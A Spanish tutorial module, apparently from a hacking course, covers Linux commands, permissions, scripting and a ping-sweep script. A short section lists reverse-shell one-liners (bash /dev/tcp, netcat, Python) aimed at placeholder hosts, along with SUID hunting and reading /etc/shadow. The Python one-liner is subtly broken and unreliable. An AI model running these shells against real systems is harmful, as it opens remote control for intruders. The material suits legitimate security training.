# 🐧 Módulo 3: Dominio de Linux

## 📖 ¿Por qué Linux?

Linux es el **sistema operativo de los hackers** por excelentes razones:

- 🆓 **Gratuito y Open Source**
- 🛠️ **Control total** del sistema
- 🔧 **Herramientas de hacking** disponibles nativamente
- 🖥️ **Servidores** - La mayoría de servidores usan Linux
- 💪 **Potencia** desde la línea de comandos

---

## 🚀 Distribuciones Recomendadas

| Distro | Uso | Nivel |
|--------|-----|-------|
| **Kali Linux** | Pentesting (tiene todas las herramientas) | Intermedio |
| **Parrot OS** | Pentesting + Privacidad | Intermedio |
| **Ubuntu** | Aprender Linux, uso general | Principiante |
| **Arch Linux** | Aprendizaje profundo | Avanzado |

### Instalación Recomendada
1. Usa **VirtualBox** o **VMware** para crear máquinas virtuales
2. Descarga Kali Linux desde: https://www.kali.org/get-kali/
3. Asigna mínimo 4GB RAM y 40GB disco

---

## 💻 Comandos Esenciales

### Navegación del Sistema de Archivos

```bash
# Dónde estoy
pwd                     # Print Working Directory

# Listar archivos
ls                      # Lista básica
ls -la                  # Lista detallada con ocultos
ls -lah                 # Con tamaños legibles

# Cambiar directorio
cd /home                # Ir a /home
cd ..                   # Subir un nivel
cd ~                    # Ir al home del usuario
cd -                    # Volver al directorio anterior

# Crear/eliminar directorios
mkdir carpeta           # Crear directorio
mkdir -p a/b/c          # Crear estructura completa
rmdir carpeta           # Eliminar directorio vacío
rm -rf carpeta          # Eliminar directorio con contenido ⚠️
```

### Manipulación de Archivos

```bash
# Crear archivos
touch archivo.txt       # Crear archivo vacío
echo "texto" > file.txt # Crear con contenido (sobrescribe)
echo "más" >> file.txt  # Añadir contenido

# Copiar/Mover
cp origen destino       # Copiar archivo
cp -r carpeta nueva     # Copiar directorio
mv origen destino       # Mover/renombrar

# Eliminar
rm archivo.txt          # Eliminar archivo
rm -f archivo.txt       # Forzar eliminación
rm -rf carpeta          # Eliminar recursivamente ⚠️

# Ver contenido
cat archivo.txt         # Ver todo el archivo
head -n 20 archivo.txt  # Primeras 20 líneas
tail -n 20 archivo.txt  # Últimas 20 líneas
less archivo.txt        # Ver paginado (q para salir)
```

### Búsqueda

```bash
# Buscar archivos
find / -name "*.txt"              # Buscar por nombre
find /home -type f -size +100M    # Archivos >100MB
find / -perm -4000 2>/dev/null    # Archivos SUID

# Buscar dentro de archivos
grep "texto" archivo.txt          # Buscar texto
grep -r "password" /etc/          # Buscar recursivo
grep -i "texto" archivo.txt       # Ignorar mayúsculas

# Localizar binarios
which python                      # Dónde está python
whereis nmap                      # Ubicaciones de nmap
locate archivo                    # Búsqueda rápida (actualizar: updatedb)
```

---

## 👤 Usuarios y Permisos

### Sistema de Permisos

```
-rwxr-xr-x 1 root root 1234 Jan 1 12:00 archivo

│└┬┘└┬┘└┬┘
│ │  │  └── Otros (Other)
│ │  └───── Grupo (Group)
│ └──────── Propietario (Owner)
└────────── Tipo (- archivo, d directorio, l link)

r = read (4)    - Leer
w = write (2)   - Escribir
x = execute (1) - Ejecutar
```

### Cambiar Permisos

```bash
# Formato simbólico
chmod +x script.sh      # Añadir ejecución
chmod u+w archivo       # Dar escritura al propietario
chmod go-rwx archivo    # Quitar todo a grupo y otros

# Formato numérico
chmod 755 script.sh     # rwxr-xr-x
chmod 644 archivo.txt   # rw-r--r--
chmod 777 archivo       # rwxrwxrwx (peligroso!)
chmod 600 secreto.txt   # rw------- (solo propietario)

# Cambiar propietario
chown usuario archivo
chown usuario:grupo archivo
chown -R usuario carpeta  # Recursivo
```

### Permisos Especiales (Importantes para Hacking!)

```bash
# SUID (Set User ID) - Se ejecuta como el propietario
chmod u+s archivo       # 4xxx
# Si un archivo es SUID y es de root, se ejecuta como root!

# SGID (Set Group ID) - Se ejecuta como el grupo
chmod g+s archivo       # 2xxx

# Sticky Bit - Solo el propietario puede borrar
chmod +t directorio     # 1xxx

# Buscar archivos SUID (común en escalada de privilegios)
find / -perm -4000 2>/dev/null
```

### Gestión de Usuarios

```bash
# Ver usuario actual
whoami
id

# Cambiar a otro usuario
su usuario              # Cambiar a usuario
su -                    # Cambiar a root
sudo comando            # Ejecutar como root

# Crear usuarios
useradd -m usuario      # Crear con home
passwd usuario          # Establecer contraseña

# Ver usuarios del sistema
cat /etc/passwd
cat /etc/shadow         # Hashes de contraseñas (solo root)
cat /etc/group          # Grupos
```

---

## 📁 Estructura del Sistema de Archivos

```
/
├── bin/        # Binarios esenciales (ls, cat, etc.)
├── boot/       # Archivos de arranque
├── dev/        # Dispositivos (discos, etc.)
├── etc/        # Configuraciones del sistema ⭐
│   ├── passwd  # Usuarios
│   ├── shadow  # Contraseñas hasheadas
│   └── hosts   # Resolución DNS local
├── home/       # Directorios de usuarios
├── opt/        # Software opcional
├── proc/       # Procesos del sistema (virtual)
├── root/       # Home del usuario root
├── tmp/        # Archivos temporales (cualquiera puede escribir)
├── usr/        # Programas de usuario
│   ├── bin/    # Binarios de usuario
│   └── share/  # Archivos compartidos
└── var/        # Archivos variables
    ├── log/    # Logs del sistema ⭐
    └── www/    # Archivos web (Apache)
```

---

## 🔧 Administración del Sistema

### Procesos

```bash
# Ver procesos
ps aux                  # Todos los procesos
ps aux | grep apache    # Filtrar por nombre
top                     # Monitor en tiempo real
htop                    # Monitor mejorado

# Gestionar procesos
kill PID                # Terminar proceso
kill -9 PID             # Forzar terminación
killall nombre          # Matar por nombre

# Procesos en background
comando &               # Ejecutar en background
jobs                    # Ver trabajos
fg %1                   # Traer a foreground
bg %1                   # Enviar a background
```

### Servicios

```bash
# Systemd (distros modernas)
systemctl start servicio
systemctl stop servicio
systemctl restart servicio
systemctl status servicio
systemctl enable servicio   # Iniciar al arrancar

# Ver servicios activos
systemctl list-units --type=service
```

### Red

```bash
# Configuración
ip addr                 # Ver interfaces
ip route                # Ver tabla de rutas
cat /etc/resolv.conf    # Servidores DNS

# Conexiones
netstat -tulpn          # Puertos en escucha
ss -tulpn               # Alternativa moderna
lsof -i :80             # Qué usa el puerto 80
```

---

## 📝 Bash Scripting Básico

### Tu Primer Script

```bash
#!/bin/bash
# Mi primer script de hacking

echo "=== Escáner de red básico ==="
echo "Tu IP es: $(hostname -I)"
echo ""
echo "Dispositivos en la red:"
# Escanea la red local
for ip in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$ip &>/dev/null && echo "Host activo: 192.168.1.$ip"
done
```

### Guardar y Ejecutar
```bash
# Crear el script
nano scanner.sh

# Dar permisos de ejecución
chmod +x scanner.sh

# Ejecutar
./scanner.sh
```

### Estructuras Básicas

```bash
# Variables
nombre="Hacker"
echo "Hola $nombre"

# Condicionales
if [ -f /etc/passwd ]; then
    echo "El archivo existe"
else
    echo "No existe"
fi

# Bucles
for i in {1..10}; do
    echo "Número: $i"
done

# While
while true; do
    echo "Presiona Ctrl+C para salir"
    sleep 1
done

# Leer input
read -p "Tu nombre: " nombre
echo "Hola $nombre"
```

---

## 🎯 Comandos para Hacking

### Información del Sistema

```bash
# Sistema operativo
uname -a                # Info completa del kernel
cat /etc/os-release     # Distribución
hostnamectl             # Info del host

# Hardware
lscpu                   # Info de CPU
free -h                 # Memoria
df -h                   # Espacio en disco
```

### Transferencia de Archivos

```bash
# Descargar
wget http://url/archivo
curl -O http://url/archivo

# Servidor HTTP rápido (útil para transferir archivos)
python3 -m http.server 8080

# SCP (copia segura)
scp archivo usuario@ip:/ruta
scp usuario@ip:/ruta/archivo .

# Netcat
nc -lvnp 4444 > archivo     # Receptor
nc ip 4444 < archivo        # Emisor
```

### Shells Reversas

```bash
# Bash
bash -i >& /dev/tcp/IP/PUERTO 0>&1

# Netcat
nc -e /bin/bash IP PUERTO

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s=connect(("IP",PUERTO));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## 🏋️ Ejercicios Prácticos

### Ejercicio 1: Navegación
```bash
1. Crea la estructura: ~/hacking/lab1/pruebas
2. Dentro de pruebas, crea 5 archivos .txt
3. Lista todos los archivos con detalles
4. Busca todos los archivos .txt en tu home
```

### Ejercicio 2: Permisos
```bash
1. Crea un script llamado test.sh con echo "Hola"
2. Intenta ejecutarlo (fallará)
3. Dale permisos de ejecución
4. Ejecútalo
5. Busca archivos SUID en /usr/bin
```

### Ejercicio 3: Script de Reconocimiento
```bash
# Crea un script que:
1. Muestre la IP del sistema
2. Liste los usuarios del sistema
3. Muestre los puertos en escucha
4. Busque archivos SUID
```

---

## 📚 Cheat Sheet de Comandos

```bash
# Navegación
pwd, ls, cd, mkdir, rmdir, rm

# Archivos
cat, head, tail, less, grep, find

# Permisos
chmod, chown, id, whoami

# Red
ip addr, netstat, ss, ping, curl, wget

# Procesos
ps, top, kill, systemctl

# Otros útiles
history         # Historial de comandos
alias ll='ls -la'   # Crear alias
man comando     # Manual del comando
comando --help  # Ayuda rápida
```

---

## ➡️ Siguiente Módulo

[Continúa con Programación para Hackers →](../04-programacion/README.md)
